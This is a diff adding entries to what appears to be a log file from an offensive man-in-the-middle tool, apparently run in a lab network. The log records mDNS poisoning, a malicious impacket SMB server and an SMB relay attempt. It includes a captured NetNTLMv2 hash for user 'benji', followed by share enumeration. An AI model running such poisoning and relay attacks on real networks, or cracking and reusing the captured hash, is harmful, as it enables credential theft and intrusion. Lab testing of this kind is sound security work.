@@ -283,3 +283,47 @@
 2021-11-05 14:26:25.070 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:86 - Exiting smb relay attack ...
 2021-11-05 14:26:25.070 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:86 - Exiting smb relay attack ...
 2021-11-05 14:26:25.070 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:86 - Exiting smb relay attack ...
+2021-11-09 18:19:49.716 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
+2021-11-09 18:19:49.717 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:54 - Starting Malicious SMB Server ...
+2021-11-09 18:19:49.725 | INFO     | impacket.smbserver:log:4132 - Config file parsed
+2021-11-09 18:19:49.726 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-11-09 18:19:49.730 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2021-11-09 18:19:57.426 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
+2021-11-09 18:19:57.458 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-09 18:20:00.782 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
+2021-11-09 18:20:00.813 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-09 18:20:30.587 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
+2021-11-09 18:20:30.630 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-09 18:20:41.074 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
+2021-11-09 18:20:41.121 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-09 18:20:53.496 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:82 - Exiting smb relay attack ...
+2021-11-09 18:20:54.827 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
+2021-11-09 18:20:54.827 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
+2021-11-09 18:20:54.828 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:54 - Starting Malicious SMB Server ...
+2021-11-09 18:20:54.828 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:54 - Starting Malicious SMB Server ...
+2021-11-09 18:20:54.831 | INFO     | impacket.smbserver:log:4132 - Config file parsed
+2021-11-09 18:20:54.831 | INFO     | impacket.smbserver:log:4132 - Config file parsed
+2021-11-09 18:20:54.832 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-11-09 18:20:54.832 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-11-09 18:20:54.838 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2021-11-09 18:20:54.838 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2021-11-09 18:20:59.363 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
+2021-11-09 18:20:59.363 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
+2021-11-09 18:20:59.404 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-09 18:20:59.404 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-09 18:21:00.374 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,49770)
+2021-11-09 18:21:00.374 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,49770)
+2021-11-09 18:21:00.411 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
+2021-11-09 18:21:00.411 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
+2021-11-09 18:21:00.413 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
+2021-11-09 18:21:00.413 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
+2021-11-09 18:21:00.415 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:2c6c134782e199a0e3c5823b0e23bf31:0101000000000000008eeb8b96d5d70105454893b38631300000000001001000520065004800460055007200470059000300100052006500480046005500720047005900020010006a006d007a0047004700700062004d00040010006a006d007a0047004700700062004d0007000800008eeb8b96d5d701060004000200000008003000300000000000000000000000002000007338c7a82b2da8bddb01153f77e9aee549063128e66e70819ec174bc93e339530a001000000000000000000000000000000000000900240063006900660073002f0063006f00730069007400610073002e006c006f00630061006c000000000000000000
+2021-11-09 18:21:00.415 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:2c6c134782e199a0e3c5823b0e23bf31:0101000000000000008eeb8b96d5d70105454893b38631300000000001001000520065004800460055007200470059000300100052006500480046005500720047005900020010006a006d007a0047004700700062004d00040010006a006d007a0047004700700062004d0007000800008eeb8b96d5d701060004000200000008003000300000000000000000000000002000007338c7a82b2da8bddb01153f77e9aee549063128e66e70819ec174bc93e339530a001000000000000000000000000000000000000900240063006900660073002f0063006f00730069007400610073002e006c006f00630061006c000000000000000000
+2021-11-09 18:21:00.454 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrWkstaGetInfo Level: 100
+2021-11-09 18:21:00.454 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrWkstaGetInfo Level: 100
+2021-11-09 18:21:00.478 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrServerGetInfo Level: 101
+2021-11-09 18:21:00.478 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrServerGetInfo Level: 101
+2021-11-09 18:21:00.564 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
+2021-11-09 18:21:00.564 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
+2021-11-09 18:21:06.872 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:82 - Exiting smb relay attack ...
+2021-11-09 18:21:06.872 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:82 - Exiting smb relay attack ...
